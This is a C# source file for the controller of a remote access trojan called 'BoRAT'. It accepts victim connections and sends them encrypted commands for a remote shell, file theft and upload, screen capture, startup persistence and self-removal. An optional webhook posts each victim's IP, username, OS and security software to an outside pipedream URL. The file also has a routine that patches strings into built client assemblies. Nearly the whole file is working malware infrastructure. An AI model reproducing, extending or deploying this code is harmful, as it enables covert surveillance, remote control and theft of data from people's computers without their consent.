using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Mono.Cecil;
using Mono.Cecil.Cil;

namespace BoRAT.Server
{
    public partial class frmMain : Form
    {
        // Change this
        private bool pipedreamEnabled = false;
        private string pipedreamURL = "https://eonvuonqbllwqpu.m.pipedream.net";
        private string encryptionKey = "B0R@t2!02@2^2%2#";

        // Networking
        private int port { get; set; }
        private int bufferSize { get; set; }
        private Socket serverSocket { get; set; }
        private Socket targetClient { get; set; }
        private readonly List<Socket> listSockets = new List<Socket>();
        private byte[] buffer { get; set; }

        // File Manager
        private string dirPath { get; set; }
        private string fdl_location { get; set; }
        private string fup_location { get; set; }
        private bool isFileDownload { get; set; }

        private byte[] receiveFile = new byte[1];
        private int writeSize;
        private int fdlSize;

        // Remote Desktop
        private bool isImage { get; set; }
        private bool fullScreen { get; set; }
        private frmRdp fullScreenRdp;

        public frmMain()
        {
            InitializeComponent();
        }

        private void btnListen_Click(object sender, EventArgs e)
        {
            try
            {
                port = (int)Nport.Value;
            }
            catch (ArgumentOutOfRangeException)
            {
                MessageBox.Show("Value is too big!", "BoRAT");
                return;
            }

            try
            {
                bufferSize = 104857600;
                buffer = new byte[bufferSize];

                serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                var ipEndPoint = new IPEndPoint(IPAddress.Any, port);

                serverSocket.Bind(ipEndPoint);
                serverSocket.Listen(50);
                serverSocket.BeginAccept(AcceptCallback, serverSocket);

                UpdateStatus();
            }
            catch (SocketException msg)
            {
                MessageBox.Show(msg.Message);
            }
        }

        private void AcceptCallback(IAsyncResult ar)
        {
            Socket connection;
            try
            {
                connection = serverSocket.EndAccept(ar);
            }
            catch (SocketException msg)
            {
                MessageBox.Show(msg.Message);
                return;
            }

            listSockets.Add(connection);
            var id = listSockets.Count;
            AddClientID(id);
            UpdateStatus();
            var command = string.Format("getInfo~{0}", id);
            SendCommand(command, id);
            //create info & command
            connection.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceivecallBack, connection);
            serverSocket.BeginAccept(AcceptCallback, null);
        }

        private void ReceivecallBack(IAsyncResult ar)
        {
            var currentSocket = (Socket)ar.AsyncState;
            int recevied;

            try
            {
                recevied = currentSocket.EndReceive(ar);
            }
            catch (SocketException msg)
            {
                MessageBox.Show(msg.Message);
                return;
            }

            var receivedBuffer = new byte[recevied];
            Array.Copy(buffer, receivedBuffer, recevied);
            //check info
            if (isImage)
                ProcessImage(receivedBuffer);
            if (isFileDownload)
                ProcessDUInfo(receivedBuffer);
            else if (!isFileDownload)
                ProcessNormalInfo(receivedBuffer);
            currentSocket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceivecallBack, currentSocket);
        }

        private void ProcessImage(byte[] data)
        {
            var header = Encoding.Unicode.GetString(data, 0, 16);
            if (header.Equals("rdpImage"))
                using (var ms = new MemoryStream())
                {
                    try
                    {
                        ms.Write(data, 16, data.Length - 16);
                        var image = (Bitmap)Image.FromStream(ms);
                        AddImage(image);
                        Array.Clear(data, 0, data.Length);
                    }

                    catch (Exception)
                    {
                    }

                    ;
                }
        }

        private void ProcessNormalInfo(byte[] receivedBuffer, string command = "")
        {
            command = Encoding.Unicode.GetString(receivedBuffer);
            command = Decrypt(command);

            if (command.StartsWith("infoBack"))
            {
                var info = command.Split('|');
                AddClientInfo(info[1]);
            }

            else if (command.StartsWith("commandout§"))
            {
                var results = command.Split('§')[1];
                UpdateUI(() => Logs.Text += results);
            }

            else if (command.StartsWith("drivesList~"))
            {
                UpdateUI(() => listFileManager.Items.Clear());

                var drives = command.Split('~')[1];
                var drivesList = drives.Split('\n');
                foreach (var driverInfo in drivesList)
                {
                    if (!driverInfo.Contains("|"))
                        continue;

                    var name = driverInfo.Split('|')[0];
                    var size = driverInfo.Split('|')[1];

                    AddFileManagerInfo(name, size, "N/A", name);
                }
            }

            else if (command.StartsWith("enterPath~"))
            {
                UpdateUI(() => listFileManager.Items.Clear());
                var info = command.Split('~')[1];
                var directories = info.Split('\n');

                foreach (var s in directories)
                {
                    if (s == "")
                        continue;
                    var name = s.Split('|')[0];
                    var size = s.Split('|')[1];
                    var creationTime = s.Split('|')[2];
                    var path = s.Split('|')[3];

                    AddFileManagerInfo(name, size, creationTime, path);
                }
            }

            else if (command.StartsWith("backPath~"))
            {
                var info = command.Split('~')[1];

                if (info.Equals("driveList"))
                {
                    UpdateUI(() => drivesListToolStripMenuItem.PerformClick());
                }
                else
                {
                    dirPath = info;
                    SendCommandToTarget("enterPath~" + info);
                }
            }

            else if (command.StartsWith("fInfo~"))
            {
                var size = int.Parse(command.Split('~')[1]);
                fdlSize = size;
                receiveFile = new byte[fdlSize];
                isFileDownload = true;
                SendCommandToTarget("fdlConfirm");
            }

            else if (command.Equals("fupConfirm"))
            {
                UpdateUI(() => LogsFileManager.Text += "Upload Request Accepted.\n" +
                                                       "Uploading " + Path.GetFileName(fup_location) + " To " +
                                                       dirPath + "\n");
                var dataToSend = File.ReadAllBytes(fup_location);
                SendFileToTarget(dataToSend);
            }

            else if (command.Equals("fileReceived"))
            {
                UpdateUI(() => LogsFileManager.Text += "Uploaded.\n");
            }

            else if (command.StartsWith("error~"))
            {
                processErrors(command.Split('~')[1]);
            }

            else if (command.StartsWith(""))
            {
                UpdateUI(() =>
                    rtbLog.Text += "\n[" + DateTime.Now.ToString("h:mm:ss tt") + "] " + command + Environment.NewLine);
            }
        }

        private void ProcessDUInfo(byte[] buffer)
        {
            UpdateUI(() => LogsFileManager.Text += "Download Request Accepted.\n");
            UpdateUI(() => LogsFileManager.Text += "Downloading \"" + Path.GetFileName(fdl_location) + "\"" + "\n");
            writeSize = 0;
            Buffer.BlockCopy(buffer, 0, receiveFile, writeSize, buffer.Length);
            writeSize += buffer.Length;

            if (writeSize == fdlSize)
                using (var fs = File.Create(fdl_location))
                {
                    var info = receiveFile;
                    fs.Write(info, 0, info.Length);
                }

            //File.WriteAllBytes(fdl_location, buffer);
            Array.Clear(receiveFile, 0, receiveFile.Length);
            UpdateUI(() => LogsFileManager.Text += Path.GetFileName(fdl_location) + " Downloaded.\n");
            isFileDownload = false;
        }

        private void processErrors(string errorText)
        {
            if (errorText.Contains("commandFailed"))
            {
                MessageBox.Show("Start command before use!", "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (errorText.Contains("Directory") || errorText.Contains("File") ||
                errorText.Contains("EnterPath") || errorText.Contains("Access"))
                UpdateUI(() => LogsFileManager.Text += errorText);
        }

        private void SendCommand(string command, int id)
        {
            var socket = listSockets[id - 1];
            var data = Encoding.Unicode.GetBytes(command);

            socket.Send(data);
        }

        private void SendCommandToTarget(string command)
        {
            // If the client isn't null.
            if (targetClient != null)
            {
                // Encrypt the command.
                command = Encrypt(command);
                // Get the bytes of the command.
                var dataToSend = Encoding.Unicode.GetBytes(command);

                // Send to the client.
                targetClient.Send(dataToSend);
            }
            else
            {
                // Display a message to the user saying to select a target.
                MessageBox.Show("Select your target!", "BoRAT", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void SendFileToTarget(byte[] data)
        {
            try
            {
                // Send the file to the client.
                targetClient.Send(data);
            }
            catch (Exception ex)
            {
                // Update the file manager logs.
                UpdateUI(() => LogsFileManager.Text += ex.Message + "\n");
            }
        }

        private void AddImage(Bitmap image)
        {
            // If the RDP isn't full screen.
            if (!fullScreen)
                // Update the image.
                UpdateUI(() => pBRdp.Image = image);
            else
                // Add the image to the RDP form.
                fullScreenRdp.image = image;
        }

        private void AddClientID(int id)
        {
            UpdateUI(() => listClients.Items.Add(id.ToString()));
        }

        private void AddClientInfo(string info)
        {
            var data = info.Split('~');
            var id = int.Parse(data[0]);
            var client = new ListViewItem();

            UpdateUI(() => client = listClients.Items[id - 1]);
            UpdateUI(() => client.SubItems.Add(data[1]));
            UpdateUI(() => client.SubItems.Add(data[2]));
            UpdateUI(() => client.SubItems.Add(data[3]));
            UpdateUI(() => client.SubItems.Add(data[4]));
            UpdateUI(() => client.SubItems.Add(data[5]));

            // Detect if pipedream is enabled.
            if (pipedreamEnabled == true)
            {
                // Create a new http client for pipedream.
                var pipedreamClient = new HttpClient();

                // Bind the data to the request.
                var pipedreamData = new[]
                {
                    new KeyValuePair<string, string>("pubip", data[1]),
                    new KeyValuePair<string, string>("username", data[2]),
                    new KeyValuePair<string, string>("os", data[3]),
                    new KeyValuePair<string, string>("security", data[4]),
                    new KeyValuePair<string, string>("datetime", data[5])
                };

                // Send a post request to the pipedream endpoint with the data.
                pipedreamClient.PostAsync(pipedreamURL, new FormUrlEncodedContent(pipedreamData)).GetAwaiter().GetResult();
            }
        }

        private void AddFileManagerInfo(string name, string size, string creationTime, string path)
        {
            if (!size.Equals("N/A"))
                size = FormatBytes(long.Parse(size));
            var lvi = new ListViewItem();
            lvi.Text = name;
            lvi.SubItems.Add(size);
            lvi.SubItems.Add(creationTime);
            lvi.SubItems.Add(path);

            UpdateUI(() => listFileManager.Items.Add(lvi));
            UpdateUI(() => listFileManager.Items[0].Selected = true);
        }

        // SOURCE : https://stackoverflow.com/questions/1242266/converting-bytes-to-gb-in-c
        private static string FormatBytes(long bytes)
        {
            string[] Suffix = { "B", "KB", "MB", "GB", "TB" };
            int i;
            double dblSByte = bytes;
            for (i = 0; i < Suffix.Length && bytes >= 1024; i++, bytes /= 1024) dblSByte = bytes / 1024.0;

            return string.Format("{0:0.##} {1}", dblSByte, Suffix[i]);
        }

        private void UpdateStatus(string text = "n")
        {
            if (text.Equals("n"))
                UpdateUI(() => lblStatus.Text =
                    string.Format("Status: Listening on port {0} | Connections: {1}", port, listClients.Items.Count));
            else
                UpdateUI(() => lblStatus.Text =
                    string.Format(text));
        }

        private void UpdateUI(Action action)
        {
            // Invoke the action parameter.
            Invoke(new Action(action), null);
        }

        private void listClients_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
                if (listClients.FocusedItem.Bounds.Contains(e.Location))
                    MenuClients.Show(Cursor.Position);
        }

        private void selectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listClients.Items.Count > 0)
            {
                int id;
                var item = listClients.FocusedItem;
                id = int.Parse(item.SubItems[0].Text);
                targetClient = listSockets[id - 1];
                var username = item.SubItems[2].Text;
                var connection = item.SubItems[1].Text;
                var statusText = string.Format("Status: Listening on port {0} | Connections: {1} | Target: {2}", port,
                    listClients.Items.Count, username);
                UpdateStatus(statusText);

                UpdateUI(() =>
                    lblStatusCommandShell.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
                UpdateUI(() =>
                    lblStatusFileManager.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
                UpdateUI(
                    () => lblStatusRdp.Text = string.Format("Connection: {0}\nUsername: {1}", connection, username));
            }
        }

        private void txtCommand_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return)
            {
                var info = "command§" + txtCommand.Text;
                
                SendCommandToTarget(info);
                txtCommand.Text = "";
            }

            else if (e.KeyCode == Keys.Return && txtCommand.Text.ToLower().Equals("cls"))
            {
                Logs.Text = "";
            }
        }

        private void runCommandShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SendCommandToTarget("startCommand");
        }

        public string Encrypt(string clearText)
        {
            var clearBytes = Encoding.Unicode.GetBytes(clearText);
            using (var encryptor = Rijndael.Create())
            {
                var pdb = new Rfc2898DeriveBytes(encryptionKey,
                    new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);

                using (var ms = new MemoryStream())
                {
                    using (var cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }

                    clearText = Convert.ToBase64String(ms.ToArray());
                }
            }

            return clearText;
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                var cipherBytes = Convert.FromBase64String(cipherText);
                using (var encryptor = Rijndael.Create())
                {
                    var pdb = new Rfc2898DeriveBytes(encryptionKey,
                        new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (var ms = new MemoryStream())
                    {
                        using (var cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }

                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }

                return cipherText;
            }
            catch (Exception)
            {
                //plain text?
                return cipherText;
            }
        }

        public static void ReplaceString(string old, string replacement, AssemblyDefinition asm)
        {
            foreach (var mod in asm.Modules)
            foreach (var td in mod.Types)
                IterateType(td, old, replacement);
        }

        public static void IterateType(TypeDefinition td, string old, string replacement)
        {
            foreach (var ntd in td.NestedTypes) IterateType(ntd, old, replacement);

            foreach (var md in td.Methods)
                if (md.HasBody)
                    for (var i = 0; i < md.Body.Instructions.Count - 1; i++)
                    {
                        var inst = md.Body.Instructions[i];
                        if (inst.OpCode == OpCodes.Ldstr)
                            if (inst.Operand.ToString().Equals(old))
                                inst.Operand = replacement;
                    }
        }

        private void drivesListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            dirPath = "drivesList";
            SendCommandToTarget("drivesList");
        }

        private void enterToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listFileManager.SelectedIndices.Count > 0)
            {
                var pathToEnter = listFileManager.SelectedItems[0].SubItems[3].Text;
                dirPath = pathToEnter;
                SendCommandToTarget("enterPath~" + pathToEnter);
            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dirPath.Equals("drivesList"))
                return;
            SendCommandToTarget("backPath~" + dirPath);
        }

        private void Logs_TextChanged(object sender, EventArgs e)
        {
            UpdateUI(() => Logs.SelectionStart = Logs.Text.Length);
            UpdateUI(() => Logs.ScrollToCaret());
        }

        private void LogsFileManager_TextChanged(object sender, EventArgs e)
        {
            UpdateUI(() => LogsFileManager.SelectionStart = LogsFileManager.Text.Length);
            UpdateUI(() => LogsFileManager.ScrollToCaret());
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listFileManager.SelectedItems.Count > 0)
            {
                if (listFileManager.SelectedItems[0].SubItems[1].Text.Equals("Directory"))
                {
                    UpdateUI(() => LogsFileManager.Text += "Cannot Download a Directory!+\n");
                    return;
                }

                if (!File.Exists(AppDomain.CurrentDomain.BaseDirectory + "\\ratDownloads"))
                    Directory.CreateDirectory(AppDomain.CurrentDomain.BaseDirectory + "\\ratDownloads");

                var filename = listFileManager.SelectedItems[0].SubItems[3].Text;
                UpdateUI(() => LogsFileManager.Text += "Sending Download Request ...\n");
                fdl_location = "ratDownloads\\" + Path.GetFileName(filename);
                SendCommandToTarget("fdl~" + filename);
            }
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var info = dirPath;
            var fileName = "";

            var ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
                fup_location = ofd.FileName;

            fileName = Path.GetFileName(fup_location);
            info += "\\" + fileName + "~" + new FileInfo(fup_location).Length;

            LogsFileManager.Text += "Sending Upload Request ...";
            SendCommandToTarget("fup~" + info);
        }

        private void btnStartRdp_Click(object sender, EventArgs e)
        {
            fullScreenRdp = new frmRdp();
            fullScreen = false;
            isImage = true;
            SendCommandToTarget("rdpStart");
        }

        private void btnRdpStop_Click(object sender, EventArgs e)
        {
            isImage = false;
            if (pBRdp.Image != null)
                UpdateUI(() => pBRdp.Image.Dispose());
            UpdateUI(() => pBRdp.Image = null);
            UpdateUI(() => comboRdp.SelectedIndex = 0);
            if (fullScreenRdp != null)
                fullScreenRdp.Close();
            SendCommandToTarget("rdpStop");
        }

        private void comboRdp_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (comboRdp.SelectedIndex)
            {
                /*
                 * Zoom Screen
                 * CenterImage
                 * AutoSize
                 * Full Screen
                */

                case 0:
                    fullScreen = false;
                    UpdateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.Zoom);
                    break;
                case 1:
                    fullScreen = false;
                    UpdateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.CenterImage);
                    break;
                case 2:
                    fullScreen = false;
                    UpdateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.AutoSize);
                    break;
                case 3:
                    fullScreen = true;
                    fullScreenRdp.Show();
                    break;
                default:
                    fullScreen = false;
                    UpdateUI(() => pBRdp.SizeMode = PictureBoxSizeMode.Zoom);
                    break;
            }
        }


        private void frmMain_Load(object sender, EventArgs e)
        {
        }

        private void btnSuicide_Click(object sender, EventArgs e)
        {
            SendCommandToTarget("suicide");
        }

        private void btnAddToStartup_Click(object sender, EventArgs e)
        {
            SendCommandToTarget("addToStartup");
        }
    }
}